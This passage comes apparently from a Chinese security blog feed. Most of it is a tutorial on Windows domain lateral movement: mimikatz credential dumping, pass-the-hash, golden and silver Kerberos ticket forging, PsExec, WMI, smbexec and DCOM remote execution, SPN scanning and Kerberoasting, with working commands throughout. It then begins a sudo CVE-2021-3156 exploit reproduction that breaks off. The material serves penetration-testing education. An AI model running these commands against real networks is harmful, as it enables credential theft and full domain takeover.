hashdump</span><br><span class="line">run post/windows/gather/smart_hashdump</span><br><span class="line"><span class="comment"># 除了meterpreter自带的，还可以通过加载mimikatz获得：</span></span><br><span class="line">load mimikatz（必须，否则无以下命令）</span><br><span class="line">msv</span><br><span class="line">tspkg</span><br><span class="line">wdigest</span><br><span class="line">kerberos</span><br><span class="line">ssp</span><br></pre></td></tr></table></figure><h3 id="三、哈希传递-Pass-the-Hash，PTH"><a href="#三、哈希传递-Pass-the-Hash，PTH" class="headerlink" title="三、哈希传递(Pass-the-Hash，PTH)"></a>三、哈希传递(Pass-the-Hash，PTH)</h3><p>从Windows Vista和Windows Server 2008版本开始，系统默认禁用LM HASH，因为在使用NTLM HASH进行身份认证时，不会使用明文密码，而是将明文密码通过系统API转化成HASH在进行对比认证，因此攻击者在获得密码哈希时就可以利用哈希传递来通过认证。</p><h4 id="利用场景："><a href="#利用场景：" class="headerlink" title="利用场景："></a>利用场景：</h4><p>适用Windwos Server 2012 R2及之后的版本，因为默认内存不会记录明文密码；</p><p>拿到HASH不容易破解明文密码；</p><p>域内主机管理员用户名密码统一使用。</p><h4 id="使用NTLM-HASH进行哈希传递"><a href="#使用NTLM-HASH进行哈希传递" class="headerlink" title="使用NTLM HASH进行哈希传递"></a>使用NTLM HASH进行哈希传递</h4><p>如果已经获取到目标的用户名及NTLM HASH值，可以管理员身份运行以下命令进行hash传递。</p><p>可以用mimikatz进行hash传递</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz "privilege::debug" "sekurlsa::pth" /user:administrator /domain:de1ay.com /ntlm:<span class="number">1</span>d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"># 获取后可以获取目录</span><br><span class="line"><span class="built_in">dir</span> \\dc\c$</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210205110806741.png" alt="image-20210205110806741"></p><p>也可以用msf进行hash传递</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.15.181</span><br><span class="line"><span class="built_in">set</span> smbuser rabbitmask</span><br><span class="line"><span class="built_in">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:0515322a55615056aaabb044a48463a4</span><br></pre></td></tr></table></figure><h4 id="使用ASE-256密钥进行哈希传递"><a href="#使用ASE-256密钥进行哈希传递" class="headerlink" title="使用ASE-256密钥进行哈希传递"></a>使用ASE-256密钥进行哈希传递</h4><p>也可以使用mimikatz利用ASE-256密钥进行哈希传递，前提是本地安装了补丁KB2871997（但是如果安装了该补丁，会导致管理员权限无法使用PsExec、WMI、smbexec、schtasks、at，也无法使用远程主机的共享文件）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz "priviledeg::debug" "sekurlsa::pth" /user:administrator /domain:de1ay.com /aes256:<span class="number">5</span>d37c27c9a06abee82a5aea3cf662834fd4318ad</span><br><span class="line"># 获取后可以获取DC(主机名)目录</span><br><span class="line"><span class="built_in">dir</span> \\dc\c$</span><br></pre></td></tr></table></figure><p>另外还有一点需要注意：更新该补丁后，发现无法使用常规的hash传递方法横向移动，但是administrator除外（SID是500），使用该账号仍然可以进行hash传递。</p><h3 id="四、票据传递（Pass-the-Ticket，PTT）"><a href="#四、票据传递（Pass-the-Ticket，PTT）" class="headerlink" title="四、票据传递（Pass-the-Ticket，PTT）"></a>四、票据传递（Pass-the-Ticket，PTT）</h3><p>Kerberos协议主要用于计算机网络的身份鉴别(Authentication), 其特点是用户只需输入一次身份验证信息就可以凭借此验证获得的票据(ticket-granting ticket)访问多个服务，即SSO(Single Sign On)。由于在每个Client和Service 之间建立了共享密钥，使得该协议具有一定的安全性。Active Directory 域服务是域或林中的默认 Kerberos 实现所必需的。</p><p>Kerberos认证流程：</p><p><img src="/imgs/image-20210205151001780.png" alt="image-20210205151001780"></p><ol><li>使用用户的NTLM哈希和时间戳一起加密，将加密的结果发送到KDC进行身份验证的票据请求 (AS REQ) ；</li><li>域控(KDC)检查用户信息(登录限制, 组成员等) 并创建票证授权票证(TGT),，将TGT加密、签名并返回给用户(AS REP)，只有域中的Kerberos服务(kbrtgt)才能打开和读取TGT数据 ；</li><li>用户请求票证授权服务票证时(TGS REQ)，会将 TGT发送给DC，DC打开TGT并验证PAC校验和，验证通过之后,，复制TGT中的数据用于创建TGS票证；</li><li>使用目标服务账户的NTLM哈希对TGS进行加密，并将加密结果发送给用户(TGS REP) ；</li><li>用户连接到服务器托管的服务端口上发送TGS给 服务器(AP REQ)，被托管的服务使用服务账户的哈希打开票证；</li><li>如果客户端需要进行相互间的身份验证就会执行这一步。</li></ol><p>伪造TGT-黄金票据；伪造TGS-&gt;白银票据。</p><h4 id="伪造黄金票据"><a href="#伪造黄金票据" class="headerlink" title="伪造黄金票据"></a>伪造黄金票据</h4><p>参考链接：<a href="https://mp.weixin.qq.com/s/45pfuc31uQEnZRUPG0_-yw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/45pfuc31uQEnZRUPG0_-yw</a></p><p>黄金票据的原理就是用krbtgt的hash来伪造TGT的内容。更改里面的client参数与session key等。让TGS以为我就是那个我所声称的人，一般声称administrator。所谓的黄金票据其实就是kerberos认证的第二个阶段中的tgs的ticket也就是TGT。这个ticket相当于对请求端的一个身份认证的凭据，如果可以伪造这个ticket，那么就可以伪造任意身份，而黄金票据就是一个实现方式。</p><h5 id="利用条件：-2"><a href="#利用条件：-2" class="headerlink" title="利用条件："></a>利用条件：</h5><ol><li>krbtgt的hash</li><li>本地管理员权限</li><li>域的sid（普通用户的sid除去最后三位就是域的sid）</li><li>域内任意用户的本地管理员权限</li></ol><h5 id="利用方法：-1"><a href="#利用方法：-1" class="headerlink" title="利用方法："></a>利用方法：</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 清空已有票据</span><br><span class="line"><span class="function">kerberos::<span class="title">purge</span></span></span><br><span class="line"><span class="function"># 制作黄金票据</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">user:Administrator</span> /<span class="title">domain:test</span>.<span class="title">com</span> /<span class="title">sid:S</span>-1-5-21-3763276348-88739081-2848684050 /<span class="title">krbtgt:d8d2ad72a119a8d418703f7a16580af6</span> /<span class="title">ticket</span>:1.<span class="title">kirbi</span></span></span><br><span class="line"><span class="function"># 加载黄金票据</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">ptt</span> 1.<span class="title">kirbi</span></span></span><br><span class="line"><span class="function"># 检测成果</span></span><br><span class="line"><span class="function"><span class="title">lsadump</span>::<span class="title">dcsync</span> /<span class="title">domain:test</span>.<span class="title">com</span> /<span class="title">user:krbtgt</span></span></span><br></pre></td></tr></table></figure><h4 id="伪造白银票据："><a href="#伪造白银票据：" class="headerlink" title="伪造白银票据："></a>伪造白银票据：</h4><p>参考链接：<a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/" target="_blank" rel="noopener">https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</a></p><ul><li>白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。</li><li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着<strong>白银票据仅限于特定服务器上的任何服务</strong>。</li><li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li><li>攻击者需要服务帐户密码哈希值</li><li>TGS是伪造的，所以没有和TGT通信，意味着DC从验证过</li><li>任何事件日志都在目标服务器上。</li></ul><h5 id="利用条件：-3"><a href="#利用条件：-3" class="headerlink" title="利用条件："></a>利用条件：</h5><ol><li>域名称</li><li>域的SID值</li><li>域中的Server服务器账户的NTLM-Hash</li><li>伪造的用户名，可以是任意用户名</li><li>目标服务器上面的kerberos服务</li></ol><h5 id="可利用的服务列表："><a href="#可利用的服务列表：" class="headerlink" title="可利用的服务列表："></a>可利用的服务列表：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">服务名称                    同时需要的服务</span><br><span class="line">WMI                        HOST、RPCSS</span><br><span class="line">PowerShell Remoting        HOST、HTTP</span><br><span class="line">WinRM                    HOST、HTTP</span><br><span class="line">Scheduled Tasks            HOST</span><br><span class="line">Windows File Share        CIFS</span><br><span class="line">LDAP                    LDAP</span><br><span class="line">Windows Remote Server    RPCSS、LDAP、CIFS</span><br></pre></td></tr></table></figure><h5 id="利用方法：-2"><a href="#利用方法：-2" class="headerlink" title="利用方法："></a>利用方法：</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 通过mimikatz查看当前域账号administrator的HASH值</span><br><span class="line">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "<span class="keyword">exit</span>" &gt; <span class="number">1</span>.txt</span><br><span class="line"><span class="function">sekurlsa::<span class="title">logonpasswords</span></span></span><br><span class="line"><span class="function"># 使用<span class="title">mimikatz</span>生成银票</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">domain</span>:0<span class="title">day.org</span> /<span class="title">sid:S</span>-1-5-21-1812960810-2335050734-3517558805 /<span class="title">target:OWA2010SP3</span>.0<span class="title">day.org</span> /<span class="title">service:cifs</span> /<span class="title">rc4</span>:125445<span class="title">ed1d553393cce9585e64e3fa07</span> /<span class="title">user:silver</span> /<span class="title">ptt</span></span></span><br><span class="line"><span class="function"># 参数说明</span></span><br><span class="line"><span class="function">/<span class="title">domain</span>：当前域名称</span></span><br><span class="line"><span class="function">/<span class="title">sid</span>：<span class="title">SID</span>值，和金票一样取前面一部分</span></span><br><span class="line"><span class="function">/<span class="title">target</span>：目标主机，这里是<span class="title">OWA2010SP3</span>.0<span class="title">day.org</span></span></span><br><span class="line"><span class="function">/<span class="title">service</span>：服务名称，这里需要访问共享文件，所以是<span class="title">cifs</span></span></span><br><span class="line"><span class="function">/<span class="title">rc4</span>：目标主机的<span class="title">HASH</span>值，<span class="title">NTLM</span> <span class="title">hash</span>值</span></span><br><span class="line"><span class="function">/<span class="title">user</span>：伪造的用户名</span></span><br><span class="line"><span class="function">/<span class="title">ptt</span>：表示的是<span class="title">Pass</span> <span class="title">TheTicket</span>攻击，是把生成的票据导入内存，也可以使用/<span class="title">ticket</span>导出之后再使用<span class="title">kerberos</span>::<span class="title">ptt</span>来导入</span></span><br></pre></td></tr></table></figure><h3 id="五、PsExec"><a href="#五、PsExec" class="headerlink" title="五、PsExec"></a>五、PsExec</h3><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noopener">PsExec</a>起初被用于大批量Windiows主机的运维，是微软提供的工具，尤其在域环境下的应用，后来被攻击者广泛使用。通过psexec可以在远程目标执行命令并且可以提权到system，其原理是通过IPC管道在远程目标机器创建一个psexec服务，并在本地磁盘中生成一个名为psexesvc的二进制文件，然后通过服务运行命令并在运行结束后删除服务。</p><h4 id="使用注意："><a href="#使用注意：" class="headerlink" title="使用注意："></a>使用注意：</h4><ol><li>使用psexec时要保证远程目标开启了admin$共享（net share admin$）</li><li>在使用ipc$连接后无需在输入账密</li><li>使用psexec执行命令会创建服务，执行完成被自动删除，会产生大量日志</li><li>使用psexec可以获取system权限的交互式shell</li><li>随着应用广泛，越来越多的反病毒厂商开始将其加入黑名单</li></ol><h4 id="使用方法：-1"><a href="#使用方法：-1" class="headerlink" title="使用方法："></a>使用方法：</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 获取system权限的交互shell，前提是获取了一个ipc$管道；-accepteula使用该参数不会弹出确认框、-s获取system权限</span><br><span class="line">psexec.exe -accepteula \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">130</span> -s <span class="built_in">cmd</span>.exe</span><br><span class="line"># 未建立ipc$管道，可以使用账密连接</span><br><span class="line">psexec \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">130</span> -u domain\administrator -p passwd <span class="built_in">cmd</span>.exe</span><br><span class="line">psexec \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">130</span> -u domain\administrator -p passwd <span class="built_in">cmd</span>.exe /c "<span class="built_in">ipconfig</span>"</span><br></pre></td></tr></table></figure><h4 id="msf的psexec模块"><a href="#msf的psexec模块" class="headerlink" title="msf的psexec模块"></a>msf的psexec模块</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/smb/psexec</span><br><span class="line">exploit/windows/smb/psexec_psh <span class="comment">#psexec的powershell版本</span></span><br></pre></td></tr></table></figure><h3 id="六、WMI"><a href="#六、WMI" class="headerlink" title="六、WMI"></a>六、WMI</h3><p>WMI（Windows Management Instrumentation）由一系列工具组成，可以在本地或者远程管理计算机。随着psexec在内网中被严格监控，攻击者开始逐渐用wmi在内网进行横向移动，使用wmi操作不会产生日志，相对来说隐蔽性更好。（使用过程中发现火绒会告警）</p><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 基本命令：执行远程命令</span><br><span class="line">wmic /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">130</span> /user:administrator /password:password process <span class="keyword">call</span> create "<span class="built_in">cmd</span>.exe /c <span class="built_in">ipconfig</span> &gt; ip.txt"</span><br><span class="line"></span><br><span class="line"># impacket工具包中的wmiexec。python环境安装impacket</span><br><span class="line">wmiexec.py administrator:password@<span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">120</span></span><br><span class="line"></span><br><span class="line"># wmiexec.vbs脚本通过VBS调用WMI来模拟psexec</span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell <span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">130</span> administrator password ["<span class="built_in">ipconfig</span>"]</span><br><span class="line"></span><br><span class="line"># 另外还有PowerSploit自带的Invoke-WmiCommand.ps1脚本和Powershell自带的Invoke-WMIMethod也可以使用</span><br></pre></td></tr></table></figure><h3 id="七、SMBexec"><a href="#七、SMBexec" class="headerlink" title="七、SMBexec"></a>七、SMBexec</h3><p>smbexec通过文件共享（admin$、C$、IPC$、D$）在远程目标执行命令。</p><p>C++版本下载地址：<a href="https://github.com/sunorr/smbexec" target="_blank" rel="noopener">https://github.com/sunorr/smbexec</a></p><p>python版本-impacket工具包的smbexec.py</p><p>可以使用impacket的exec版本：<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">https://github.com/maaaaz/impacket-examples-windows</a></p><p><img src="/imgs/image-20210220101907726.png" alt="image-20210220101907726"></p><p>使用方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py -h</span><br><span class="line">python smbexec.py domain/administrator:password@192.168.111.130</span><br></pre></td></tr></table></figure><p>Linux跨Windows执行命令</p><p>下载链接：<a href="https://github.com/brav0hax/smbexec" target="_blank" rel="noopener">https://github.com/brav0hax/smbexec</a></p><p>使用方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载安装</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/brav0hax/smbexec.git</span><br><span class="line"><span class="built_in">cd</span> smbexec</span><br><span class="line">chmod u+x install.sh &amp;&amp; bash install.sh</span><br><span class="line"><span class="comment"># 功能</span></span><br></pre></td></tr></table></figure><h3 id="八、DCOM在远程系统中的使用"><a href="#八、DCOM在远程系统中的使用" class="headerlink" title="八、DCOM在远程系统中的使用"></a>八、DCOM在远程系统中的使用</h3><p>DCOM（分布式组件对象）是微软的一系列概念和程序接口。通过DCOM客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求。</p><h4 id="使用方法：-2"><a href="#使用方法：-2" class="headerlink" title="使用方法："></a>使用方法：</h4><h5 id="获取DCOM程序列表"><a href="#获取DCOM程序列表" class="headerlink" title="获取DCOM程序列表"></a>获取DCOM程序列表</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># powershell3.0以上版本（Windows Server 2012及以上系统）</span></span><br><span class="line"><span class="built_in">get-ciminstance</span> Win32_DCOMApplication</span><br><span class="line"><span class="comment"># Powershell2.0（win7、Windows Server 2008）</span></span><br><span class="line"><span class="built_in">get-wmiobject</span> <span class="literal">-namespace</span> root\cimv2 <span class="literal">-class</span> win32_domapplication</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210220104727240.png" alt="image-20210220104727240"></p><h5 id="使用DCOM执行任意命令"><a href="#使用DCOM执行任意命令" class="headerlink" title="使用DCOM执行任意命令"></a>使用DCOM执行任意命令</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用MMC20.Application接口在本地启动一个管理员权限的powershell</span></span><br><span class="line"><span class="variable">$com</span> = [<span class="type">activator</span>]::CreateInstance([<span class="type">type</span>]::GetTypeFromProgID(<span class="string">"MMC20.Application"</span>,<span class="string">"127.0.0.1"</span>))</span><br><span class="line"><span class="comment"># 执行命令</span></span><br><span class="line"><span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">'cmd.exe'</span>,<span class="variable">$null</span>,<span class="string">"/c calc.exe"</span>,<span class="string">"Minimized"</span>)</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210220105510711.png" alt="image-20210220105510711"></p><h5 id="使用DCOM在远程目标执行命令"><a href="#使用DCOM在远程目标执行命令" class="headerlink" title="使用DCOM在远程目标执行命令"></a>使用DCOM在远程目标执行命令</h5><p>目标：192.168.111.80</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、建立ipc$</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">111.80</span> <span class="string">"tst@123"</span> /user:test</span><br><span class="line"><span class="comment"># 2、调用MMC20.Application执行命令</span></span><br><span class="line"><span class="variable">$com</span> = [<span class="type">activator</span>]::CreateInstance([<span class="type">type</span>]::GetTypeFromProgID(<span class="string">"MMC20.Application"</span>,<span class="string">"192.168.111.80"</span>))</span><br><span class="line"><span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">'cmd.exe'</span>,<span class="variable">$null</span>,<span class="string">"/c calc.exe"</span>,<span class="string">"Minimized"</span>)</span><br><span class="line"><span class="comment"># 3、或者调用’9BA05972-F6A8-11CF-A442-00A0C90A8F39’执行远程命令</span></span><br><span class="line"><span class="variable">$com</span> = [<span class="type">Type</span>]::GetTypeFromCLSID(<span class="string">'9BA05972-F6A8-11CF-A442-00A0C90A8F39'</span>,<span class="string">"192.168.111.80"</span>)</span><br><span class="line"><span class="variable">$obj</span> = [<span class="type">System.Activator</span>]::CreateInstance(<span class="variable">$com</span>)</span><br><span class="line"><span class="variable">$item</span> = <span class="variable">$obj</span>.item()</span><br><span class="line"><span class="variable">$item</span>.Document.Application.ShellExecute(<span class="string">"cmd.exe"</span>,<span class="string">"/c calc.exe"</span>,<span class="string">"c:windowssystem32"</span>,<span class="variable">$null</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="九、SPN在域环境中的应用"><a href="#九、SPN在域环境中的应用" class="headerlink" title="九、SPN在域环境中的应用"></a>九、SPN在域环境中的应用</h3><p>在域环境中运行的大量应用包含各种资源，为资源合理分组、分类和再分配提供了便利，微软给各种资源分配了不同的服务主题名称（Service Principal Name，SPN）。</p><h4 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h4><p>对于域内置帐户默认注册了SPN，非内置帐户需要进行手动注册，并且域环境中的每台服务器都需要在kerberos身份验证中注册SPN，攻击者通过向域控查询请求需要的SPN，便可以知道SPN位置。因此通过SPN扫描就可以获取服务资源所在位置。</p><p>根据之前分析过的Kerberos协议，用户账密登录AD，域控对账密进行验证，验证通过后KDC会将服务授权票据（TGT）发给用户，用户使用TGT 访问资源。举个栗子，用户访问MYSQL服务，先向域控查询SYN为MYSQL的记录，找到记录后服务器与KDC进行通信，将KDC发放的TGT作为身份凭据发送给KDC进行验证，KDC解密验证成功后，由TGS将一张允许访问mysql spn的服务票据和对应spn服务地址发给用户，用户便可以访问MYSQL服务。</p><p><img src="/imgs/image-20210205151001780.png" alt="image-20210205151001780"></p><h5 id="SPN命令格式"><a href="#SPN命令格式" class="headerlink" title="SPN命令格式"></a>SPN命令格式</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SPN = serviceclass "/" hostname [":"port] ["/" servicename]</span><br><span class="line"># 参数说明</span><br><span class="line">serviceclass：服务组件名称</span><br><span class="line">hostname：全限定域名，同时带有计算机名和域名</span><br><span class="line">port：端口</span><br><span class="line">servicename：服务的专有名称（DN）、objectGuid、Internet主机名或者权限定域名</span><br></pre></td></tr></table></figure><h5 id="常见SPN服务"><a href="#常见SPN服务" class="headerlink" title="常见SPN服务"></a>常见SPN服务</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># MSSQL服务</span><br><span class="line">MSSQLvc/computer1.domain:<span class="number">1433</span></span><br><span class="line"># Exchange服务</span><br><span class="line">exchangeMDB/EXCAS01.pentest.com</span><br><span class="line"># RDP服务</span><br><span class="line">TEAMSERV/EXCAS01.pentest.com</span><br><span class="line"># WSMan/WinRM/PSRemoting服务</span><br><span class="line">WSMan/EXCAS01.pentest.com</span><br></pre></td></tr></table></figure><h5 id="使用powershell进行SPN扫描"><a href="#使用powershell进行SPN扫描" class="headerlink" title="使用powershell进行SPN扫描"></a>使用powershell进行SPN扫描</h5><p><a href="https://github.com/PyroTek3/PowerShell-AD-Recon" target="_blank" rel="noopener">powershell-ad-recon</a>工具包提供了一系列服务与服务登录帐号和运行服务的主机之间的对应关系，这些服务包括但不限于MSSQL、Exchange、RDP、WinRM。</p><p>使用方法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 扫描MSSQL服务</span></span><br><span class="line"><span class="built_in">import-module</span> .\Discover<span class="literal">-PSMSSQLServers</span>.ps1</span><br><span class="line">Discover<span class="literal">-PSMSSQLServers</span></span><br><span class="line"><span class="comment"># 扫描所有SPN信息</span></span><br><span class="line"><span class="built_in">import-module</span> .\Discover<span class="literal">-PSInterestingServices</span></span><br><span class="line">Discover<span class="literal">-PSInterestingServices</span></span><br></pre></td></tr></table></figure><h5 id="使用Windows自带工具列出SPN信息"><a href="#使用Windows自带工具列出SPN信息" class="headerlink" title="使用Windows自带工具列出SPN信息"></a>使用Windows自带工具列出SPN信息</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T domain -q */*</span><br></pre></td></tr></table></figure><h4 id="Kerberoast攻击"><a href="#Kerberoast攻击" class="headerlink" title="Kerberoast攻击"></a>Kerberoast攻击</h4><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">Kerberoast</a>是一种针对Kerberos协议的攻击，通过 <strong>爆破TGS-REP</strong> 实现，在TGS_REP的过程中用户将会收到由目标服务实例的NTLM hash加密生成的TGS(service ticket)，加密算法为RC4-HMAC，如果获得这个TGS，我们可以尝试穷举口令，模拟加密过程，进行破解。</p><h5 id="使用示例-破解mssql服务的票据："><a href="#使用示例-破解mssql服务的票据：" class="headerlink" title="使用示例-破解mssql服务的票据："></a>使用示例-破解mssql服务的票据：</h5><p>请求SPN Kerberos票据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在powershell下输入以下命令。请求单个TGS</span></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> System.IdentityModel</span><br><span class="line"><span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="string">"MSSQLSvc\computer1.pentest.com"</span></span><br></pre></td></tr></table></figure><p>导出票据并破解</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 在mimikatz执行命令，将内存中的票据导出，导出的票据会保存在当前目录的kirbi文件中</span><br><span class="line"><span class="function">kerberos::<span class="title">list</span> /<span class="title">export</span></span></span><br><span class="line"><span class="function"># 使用<span class="title">Kerberosast</span>脚本离线破解票据对应帐号的<span class="title">NTLM</span> <span class="title">hash</span>。<span class="title">wordlist</span>是字典</span></span><br><span class="line"><span class="function"><span class="title">tgsrepcrack.py</span> <span class="title">wordlist.txt</span> <span class="title">test.kirbi</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
            <tag> 横向移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux sudo提权 CVE-2021-3156复现</title>
      <link href="2021/02/01/Linux-sudo%E6%8F%90%E6%9D%83-CVE-2021-3156%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/02/01/Linux-sudo%E6%8F%90%E6%9D%83-CVE-2021-3156%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h4><blockquote><p>1月26日，Sudo发布安全通告，修复了一个类Unix操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。请受影响的用户尽快采取措施进行防护。</p></blockquote><p>影响版本：Sudo 1.8.2 ‐ 1.8.31p2；Sudo 1.9.0 ‐ 1.9.5p1</p><h4 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h4><p>复现这个漏洞试了很多次，刚开始poc出现的时候就在复现，试了kali和centos都失败了，后来发现是sudo版本没有注意到。昨天听说exp出来了，就又尝试了下，发现sudo 1.9.0(kali2020.2)没复现成功，1.8.27复现成功了，不知道是不是1.9.0不在影响范围内。</p><p>复现脚本：<a href="https://github.com/blasty/CVE-2021-3156" target="_blank" rel="noopener">https://github.com/blasty/CVE-2021-3156</a></p><p>复现环境：kali2019.2，Sudo 1.8.27</p><p>先添加一个普通用户kali并切换到普通用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 